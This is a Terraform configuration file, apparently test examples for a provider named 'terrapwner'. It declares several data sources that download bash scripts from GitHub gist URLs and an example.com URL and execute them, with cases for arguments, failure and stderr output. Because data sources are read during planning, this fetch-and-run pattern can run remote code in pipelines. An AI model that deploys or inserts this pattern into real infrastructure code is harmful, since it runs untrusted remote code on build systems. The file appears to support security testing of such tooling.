terraform {
  required_providers {
    terrapwner = {
      source = "hashicorp.com/edu/terrapwner"
    }
  }
}

provider "terrapwner" {}

# Basic bash script execution
data "terrapwner_remote_exec" "basic" {
  url            = "https://gist.githubusercontent.com/xen0ldog/6cf803a82b15455ea17aa442b2862491/raw/b5773dd40e9cd26ece7c3cff578d5af704548516/test.sh"
  interpreter    = "bash"
  expect_success = true
}

# Bash script with arguments
data "terrapwner_remote_exec" "with_args" {
  url            = "https://gist.githubusercontent.com/xen0ldog/6cf803a82b15455ea17aa442b2862491/raw/b5773dd40e9cd26ece7c3cff578d5af704548516/test.sh"
  interpreter    = "bash"
  args           = ["arg1", "arg2"]
  expect_success = true
}

# Non-existent script
data "terrapwner_remote_exec" "non_existent" {
  url           = "https://example.com/scripts/non-existent.sh"
  interpreter   = "bash"
  fail_on_error = false
}

# Script that's expected to fail
data "terrapwner_remote_exec" "failing" {
  url            = "https://gist.githubusercontent.com/xen0ldog/6cf803a82b15455ea17aa442b2862491/raw/b5773dd40e9cd26ece7c3cff578d5af704548516/fail.sh"
  interpreter    = "bash"
  expect_success = false
}

# Script that writes to stderr
data "terrapwner_remote_exec" "stderr" {
  url         = "https://gist.githubusercontent.com/xen0ldog/6cf803a82b15455ea17aa442b2862491/raw/b5773dd40e9cd26ece7c3cff578d5af704548516/stderr.sh"
  interpreter = "bash"
}

# Output complete responses
output "basic_response" {
  value = data.terrapwner_remote_exec.basic
}

output "with_args_response" {
  value = data.terrapwner_remote_exec.with_args
}

output "non_existent_response" {
  value = data.terrapwner_remote_exec.non_existent
}

output "failing_response" {
  value = data.terrapwner_remote_exec.failing
}

output "stderr_response" {
  value = data.terrapwner_remote_exec.stderr
}
